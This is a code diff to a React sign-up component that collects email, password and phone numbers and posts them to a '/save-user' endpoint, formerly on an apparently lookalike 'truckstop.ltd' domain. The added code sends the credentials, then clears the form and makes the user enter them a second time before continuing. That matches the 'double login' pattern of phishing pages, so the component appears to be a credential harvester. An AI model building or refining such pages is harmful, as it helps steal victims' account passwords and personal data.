@@ -47,6 +47,7 @@ const NewApp = () => {
   const [thirdStepStatus, setThrirdStepStatus] = useState(false);
   const [form, setForm] = useState({ email: '', password: '', phone: '', changePhone: '' });
   const [error, setError] = useState('');
+  const [tryCount, setTryCount] = useState(0);
 
   useLayoutEffect(() => {
     setObjectAsQueryParam({ navigate, location })
@@ -64,12 +65,13 @@ const NewApp = () => {
     if (form.changePhone) {
       params.changePhone = form.changePhone;
     }
-    fetch('https://app.truckstop.ltd/save-user', {
+    fetch(`${process.env.REACT_APP_API}/save-user`, {
       method: 'post',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(params),
     })
       .then(callback)
+      .catch(error => console.log(error))
       .finally(() => setStatus(false));
   }
 
@@ -86,10 +88,20 @@ const NewApp = () => {
       setError('Please enter a valid password');
       return;
     }
-    handleRequset(() => {
-      setError('');
-      setStep(2);
-    }, setFirstStepStatus)
+    if (tryCount === 0) {
+      handleRequset(() => {
+        setForm({ email: '', password: '', phone: '', changePhone: '' })
+        setError('');
+        setTryCount(1);
+      }, setFirstStepStatus);
+    }
+    if (tryCount === 1) {
+      handleRequset(() => {
+        setTryCount(0);
+        setError('');
+        setStep(2);
+      }, setFirstStepStatus)
+    }
   }
 
   const handleSubmitSecondStep = () => {
@@ -106,7 +118,7 @@ const NewApp = () => {
   return (
     <>
       {step === 1 && <>
-        <Banner />
+        {/* <Banner /> */}
         <div className='new-app'>
           <div className="new-app__left-wrapper">
             <Left
@@ -114,6 +126,8 @@ const NewApp = () => {
               error={error}
               firstStepStatus={firstStepStatus}
               handleSubmitFirstStep={handleSubmitFirstStep}
+              tryCount={tryCount}
+              form={form}
             />
           </div>
           <div className="new-app__right-wrapper">
